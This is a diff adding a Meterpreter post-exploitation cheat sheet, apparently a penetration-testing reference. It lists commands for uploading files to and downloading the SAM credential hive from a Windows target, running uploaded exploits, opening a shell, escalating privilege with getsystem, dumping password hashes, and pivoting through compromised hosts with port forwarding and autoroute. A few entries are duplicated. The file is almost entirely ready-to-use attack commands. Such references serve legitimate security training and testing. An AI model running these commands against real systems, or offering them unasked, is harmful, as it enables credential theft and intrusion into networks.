@@ -1,0 +1,44 @@
+upload file c:\\windows
+	Meterpreter upload file to Windows target
+download c:\\windows\\repair\\sam /tmp
+	Meterpreter download file from Windows target
+download c:\\windows\\repair\\sam /tmp
+	Meterpreter download file from Windows target
+execute -f c:\\windows\temp\exploit.exe
+	Meterpreter run .exe on target - handy for executing uploaded exploits
+execute -f cmd -c 
+	Creates new channel with cmd shell
+ps
+	Meterpreter show processes
+shell
+	Meterpreter get shell on the target
+getsystem
+	Meterpreter attempts priviledge escalation the target
+hashdump
+	Meterpreter attempts to dump the hashes on the target
+portfwd add –l 3389 –p 3389 –r target
+	Meterpreter create port forward to target machine
+portfwd delete –l 3389 –p 3389 –r target
+	Meterpreter delete port forward
+
+Pivoting
+	portfwd add –l 3389 –p 3389 –r target-host
+		Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
+	portfwd delete –l 3389 –p 3389 –r target-host
+		Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
+	portfwd flush
+		Meterpreter delete all port forwards
+	portfwd list
+		Meterpreter list active port forwards
+	run autoroute -s 192.168.15.0/24
+		Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
+	run autoroute -p
+		Meterpreter list all active routes
+	route
+		Meterpreter view available networks the compromised host can access
+	route add 192.168.14.0 255.255.255.0 3
+		Meterpreter add route for 192.168.14.0/24 via Session 3.
+	route delete 192.168.14.0 255.255.255.0 3
+		Meterpreter delete route for 192.168.14.0/24 via Session 3.
+	route flush
+		Meterpreter delete all routes
